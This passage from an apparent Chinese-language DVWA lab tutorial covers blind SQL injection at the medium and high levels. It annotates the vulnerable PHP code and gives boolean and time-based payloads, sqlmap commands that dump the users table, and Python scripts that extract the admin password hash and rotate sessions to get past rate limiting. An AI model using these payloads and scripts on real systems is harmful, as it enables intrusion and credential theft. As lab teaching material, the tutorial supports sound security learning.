<h3 id="仍存在的漏洞"><a href="#仍存在的漏洞" class="headerlink" title="仍存在的漏洞"></a>仍存在的漏洞</h3><p><strong>关键问题：</strong></p>
<p>虽然使用了<code>mysqli_real_escape_string()</code>，但：</p>
<ol>
<li><p><strong>数字型注入</strong> - 查询中<code>user_id = $id</code>没有引号！</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 注意：没有引号包围$id</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> $id;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>mysqli_real_escape_string()只转义引号</strong> - 对数字型注入无效</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入: 1 <span class="keyword">OR</span> <span class="attribute">1</span>=1</span><br><span class="line">mysqli_real_escape_string(): 1 <span class="keyword">OR</span> <span class="attribute">1</span>=1 (不变)</span><br><span class="line">SQL: SELECT * <span class="keyword">FROM</span><span class="built_in"> users </span>WHERE user_id = 1 <span class="keyword">OR</span> <span class="attribute">1</span>=1;</span><br><span class="line">结果：注入成功！</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="方法1：数字型注入（最直接）"><a href="#方法1：数字型注入（最直接）" class="headerlink" title="方法1：数字型注入（最直接）"></a>方法1：数字型注入（最直接）</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 基础测试</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>    → <span class="keyword">User</span> <span class="keyword">exists</span>（返回所有用户）</span><br><span class="line"><span class="number">1</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>   → <span class="keyword">User</span> <span class="keyword">not</span> found（<span class="literal">False</span>）</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 布尔盲注</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="string">&#x27;d&#x27;</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">AND</span> LENGTH(database())<span class="operator">=</span><span class="number">4</span></span><br></pre></td></tr></table></figure>

<h4 id="方法2：时间盲注"><a href="#方法2：时间盲注" class="headerlink" title="方法2：时间盲注"></a>方法2：时间盲注</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 基础测试</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">AND</span> SLEEP(<span class="number">5</span>)</span><br><span class="line">→ 响应延迟<span class="number">5</span>秒</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 条件时间盲注</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">AND</span> IF((<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="string">&#x27;d&#x27;</span>, SLEEP(<span class="number">5</span>), <span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h4 id="方法3：使用SQLMap"><a href="#方法3：使用SQLMap" class="headerlink" title="方法3：使用SQLMap"></a>方法3：使用SQLMap</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 指定POST参数</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://dvwa.local/vulnerabilities/sqli_blind/&quot;</span> \</span><br><span class="line">       --data=<span class="string">&quot;id=1&amp;Submit=Submit&quot;</span> \</span><br><span class="line">       --cookie=<span class="string">&quot;security=medium; PHPSESSID=your_session&quot;</span> \</span><br><span class="line">       --batch \</span><br><span class="line">       -p <span class="built_in">id</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用时间盲注技术</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://dvwa.local/vulnerabilities/sqli_blind/&quot;</span> \</span><br><span class="line">       --data=<span class="string">&quot;id=1&amp;Submit=Submit&quot;</span> \</span><br><span class="line">       --cookie=<span class="string">&quot;security=medium; PHPSESSID=your_session&quot;</span> \</span><br><span class="line">       --technique=T \</span><br><span class="line">       -D dvwa -T <span class="built_in">users</span> --dump</span><br></pre></td></tr></table></figure>

<h4 id="方法4：Python脚本自动化"><a href="#方法4：Python脚本自动化" class="headerlink" title="方法4：Python脚本自动化"></a>方法4：Python脚本自动化</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://dvwa.local/vulnerabilities/sqli_blind/&quot;</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;security&#x27;</span>: <span class="string">&#x27;medium&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;your_session&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_condition</span>(<span class="params">condition</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;测试条件是否为True&quot;&quot;&quot;</span></span><br><span class="line">    payload = <span class="string">f&quot;1 AND <span class="subst">&#123;condition&#125;</span>&quot;</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;id&#x27;</span>: payload, <span class="string">&#x27;Submit&#x27;</span>: <span class="string">&#x27;Submit&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    response = requests.post(url, data=data, cookies=cookies)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;exists&#x27;</span> <span class="keyword">in</span> response.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_string</span>(<span class="params">query, length</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;提取字符串（布尔盲注）&quot;&quot;&quot;</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">        <span class="comment"># 二分法查找字符</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789_&#x27;</span>:</span><br><span class="line">            condition = <span class="string">f&quot;(SELECT SUBSTRING((<span class="subst">&#123;query&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))=&#x27;<span class="subst">&#123;c&#125;</span>&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> check_condition(condition):</span><br><span class="line">                result += c</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Found char <span class="subst">&#123;i&#125;</span>: <span class="subst">&#123;c&#125;</span> (current: <span class="subst">&#123;result&#125;</span>)&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库名长度</span></span><br><span class="line"><span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    <span class="keyword">if</span> check_condition(<span class="string">f&quot;LENGTH(database())=<span class="subst">&#123;length&#125;</span>&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Database name length: <span class="subst">&#123;length&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取数据库名</span></span><br><span class="line">db_name = extract_string(<span class="string">&quot;database()&quot;</span>, length)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Database name: <span class="subst">&#123;db_name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取admin密码</span></span><br><span class="line">password = extract_string(<span class="string">&quot;SELECT password FROM users WHERE user=&#x27;admin&#x27;&quot;</span>, <span class="number">32</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Admin password hash: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="High-难度"><a href="#High-难度" class="headerlink" title="High 难度"></a>High 难度</h2><h3 id="攻击目标-2"><a href="#攻击目标-2" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>使用了LIMIT和Session，增加了复杂度，但仍可盲注。</p>
<h3 id="后端代码分析-2"><a href="#后端代码分析-2" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_COOKIE</span>[ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进1：使用Cookie传递数据 ★★★</span></span><br><span class="line">    <span class="comment">// 而不是GET或POST</span></span><br><span class="line">    <span class="comment">// 但这不能防止SQL注入！</span></span><br><span class="line">    <span class="comment">// 攻击者仍可以修改Cookie</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_COOKIE</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进2：使用Session限制尝试次数 ★★★</span></span><br><span class="line">    <span class="comment">// 检查Session中是否有尝试次数记录</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="keyword">isset</span>( <span class="variable">$_SESSION</span>[<span class="string">&#x27;count&#x27;</span>] ) ) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;count&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 限流机制 ★★★</span></span><br><span class="line">    <span class="comment">// 每次请求增加计数</span></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;count&#x27;</span>]++;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 问题：限制不够严格 ★★★</span></span><br><span class="line">    <span class="comment">// 只是在特定次数后暂停1秒</span></span><br><span class="line">    <span class="comment">// 攻击者可以通过：</span></span><br><span class="line">    <span class="comment">// 1. 清除Session</span></span><br><span class="line">    <span class="comment">// 2. 使用多个Session</span></span><br><span class="line">    <span class="comment">// 3. 忍受延迟继续攻击</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$_SESSION</span>[<span class="string">&#x27;count&#x27;</span>] &gt; <span class="number">3</span> ) &#123;</span><br><span class="line">        <span class="comment">// 暂停1秒（轻微的速率限制）</span></span><br><span class="line">        <span class="title function_ invoke__">sleep</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用mysqli_real_escape_string()转义</span></span><br><span class="line">    <span class="variable">$id</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ?</span><br><span class="line">           <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$id</span> ) :</span><br><span class="line">           ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call!&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进3：添加LIMIT 1 ★★★</span></span><br><span class="line">    <span class="comment">// LIMIT 1 - 只返回一行结果</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 目的：限制结果数量</span></span><br><span class="line">    <span class="comment">// 问题：</span></span><br><span class="line">    <span class="comment">// 1. 不能防止SQL注入</span></span><br><span class="line">    <span class="comment">// 2. 攻击者仍可以使用盲注</span></span><br><span class="line">    <span class="comment">// 3. 可以使用UNION绕过（在某些情况下）</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// ★★★ 改进4：重置Session计数 ★★★</span></span><br><span class="line">        <span class="comment">// 查询失败后重置</span></span><br><span class="line">        <span class="comment">// 但这实际上帮助了攻击者（可以无限尝试）</span></span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;count&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>HTML部分（JavaScript设置Cookie）：</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;form1&quot;</span> <span class="attr">onsubmit</span>=<span class="string">&quot;return setCookie();&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        User ID:</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">size</span>=<span class="string">&quot;15&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// ★★★ 使用JavaScript设置Cookie ★★★</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">setCookie</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> id = <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="string">&quot;form1&quot;</span>][<span class="string">&quot;id&quot;</span>].<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 设置Cookie</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// path=/ - Cookie对整个网站有效</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">&quot;id=&quot;</span> + id + <span class="string">&quot;; path=/&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 重新加载页面，触发PHP处理Cookie</span></span></span><br><span class="line"><span class="language-javascript">    location.<span class="title function_">reload</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 防止表单提交</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="新增防护-1"><a href="#新增防护-1" class="headerlink" title="新增防护"></a>新增防护</h3><ol>
<li><strong>使用Cookie</strong> - 数据通过Cookie传递</li>
<li><strong>Session计数</strong> - 限制尝试次数</li>
<li><strong>添加LIMIT</strong> - 限制查询结果</li>
<li><strong>速率限制</strong> - sleep()延迟</li>
</ol>
<h3 id="仍存在的漏洞-1"><a href="#仍存在的漏洞-1" class="headerlink" title="仍存在的漏洞"></a>仍存在的漏洞</h3><p><strong>核心问题：</strong></p>
<ol>
<li><strong>仍是字符串拼接</strong> - 有单引号，但仍可注入</li>
<li><strong>限流太弱</strong> - 只延迟1秒，可以忍受</li>
<li><strong>Session可重置</strong> - 清除Cookie重新开始</li>
<li><strong>LIMIT不防注入</strong> - 可以用注释绕过</li>
</ol>
<p><strong>LIMIT绕过：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 原始查询</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;$id&#x27;</span> LIMIT <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 注释掉LIMIT</span></span><br><span class="line">$id <span class="operator">=</span> <span class="number">1</span><span class="string">&#x27; --</span></span><br><span class="line"><span class="string">结果：SELECT * FROM users WHERE user_id = &#x27;</span><span class="number">1</span><span class="string">&#x27; --&#x27;</span> LIMIT <span class="number">1</span>;</span><br><span class="line">简化：<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 或使用#</span></span><br><span class="line">$id <span class="operator">=</span> <span class="number">1</span><span class="string">&#x27; #</span></span><br><span class="line"><span class="string">结果：SELECT * FROM users WHERE user_id = &#x27;</span><span class="number">1</span><span class="string">&#x27; #&#x27;</span> LIMIT <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<h3 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="方法1：注释绕过LIMIT"><a href="#方法1：注释绕过LIMIT" class="headerlink" title="方法1：注释绕过LIMIT"></a>方法1：注释绕过LIMIT</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 使用--注释</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND 1=1 --</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="string">&#x27;d&#x27;</span> <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 使用#注释</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND 1=1 #</span></span><br></pre></td></tr></table></figure>

<h4 id="方法2：容忍速率限制"><a href="#方法2：容忍速率限制" class="headerlink" title="方法2：容忍速率限制"></a>方法2：容忍速率限制</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://dvwa.local/vulnerabilities/sqli_blind/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建Session（保持Cookie）</span></span><br><span class="line">session = requests.Session()</span><br><span class="line">session.cookies.<span class="built_in">set</span>(<span class="string">&#x27;security&#x27;</span>, <span class="string">&#x27;high&#x27;</span>)</span><br><span class="line">session.cookies.<span class="built_in">set</span>(<span class="string">&#x27;PHPSESSID&#x27;</span>, <span class="string">&#x27;your_session&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_condition</span>(<span class="params">condition</span>):</span><br><span class="line">    payload = <span class="string">f&quot;1&#x27; AND <span class="subst">&#123;condition&#125;</span> --&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置Cookie</span></span><br><span class="line">    session.cookies.<span class="built_in">set</span>(<span class="string">&#x27;id&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    response = session.get(url)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># High难度可能有延迟，需要更长超时</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;exists&#x27;</span> <span class="keyword">in</span> response.text</span><br><span class="line"></span><br><span class="line"><span class="comment"># 继续盲注（虽然慢，但可行）</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> check_condition(<span class="string">f&quot;(SELECT SUBSTRING(database(),<span class="subst">&#123;i&#125;</span>,1))=&#x27;<span class="subst">&#123;c&#125;</span>&#x27;&quot;</span>):</span><br><span class="line">            result += c</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Found: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 增加延迟以适应限流</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h4 id="方法3：使用多个Session绕过限流"><a href="#方法3：使用多个Session绕过限流" class="headerlink" title="方法3：使用多个Session绕过限流"></a>方法3：使用多个Session绕过限流</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当一个Session被限流，切换到另一个</span></span><br><span class="line">sessions = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    s = requests.Session()</span><br><span class="line">    s.cookies.<span class="built_in">set</span>(<span class="string">&#x27;security&#x27;</span>, <span class="string">&#x27;high&#x27;</span>)</span><br><span class="line">    s.cookies.<span class="built_in">set</span>(<span class="string">&#x27;PHPSESSID&#x27;</span>, <span class="string">f&#x27;session_<span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">    sessions.append(s)</span><br><span class="line"></span><br><span class="line">current_session = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_with_rotation</span>(<span class="params">condition</span>):</span><br><span class="line">    <span class="keyword">global</span> current_session</span><br><span class="line">    session = sessions[current_session]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 每3次请求切换Session</span></span><br><span class="line">    <span class="keyword">if</span> current_session % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">        current_session = (current_session + <span class="number">1</span>) % <span class="built_in">len</span>(sessions)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用当前Session检查</span></span><br><span class="line">    <span class="comment"># ...</span></span><br></pre></td></tr></table></figure>

